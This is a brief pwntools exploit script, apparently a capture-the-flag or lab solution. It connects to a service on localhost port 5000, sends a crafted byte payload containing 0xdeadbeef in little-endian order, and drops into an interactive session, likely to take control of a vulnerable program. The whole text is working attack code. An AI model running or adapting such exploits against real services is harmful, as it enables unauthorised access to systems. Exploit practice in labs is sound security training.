from pwn import *

r = remote('localhost', 5000)

r.sendline(b"\x7f\xff\xef\xbe\xad\xde\x00")

r.interactive()
